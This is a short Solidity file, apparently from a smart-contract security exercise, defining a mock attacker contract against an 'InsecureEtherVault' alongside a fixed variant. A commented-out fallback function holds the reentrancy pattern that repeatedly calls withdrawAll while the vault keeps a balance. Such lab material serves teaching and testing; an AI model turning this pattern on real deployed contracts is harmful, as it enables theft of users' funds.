// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./InsecureEtherVault.sol";
import "./FixedEtherVault.sol";

contract MockContract{
    InsecureEtherVault public vault;

    constructor(InsecureEtherVault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.withdrawAll();
    }


    // fallback() external payable {
    //     if(address(vault).balance >= 1 ether){
    //         vault.withdrawAll();
    //     }
    // }
    // receive() external payable{

    // }
    
}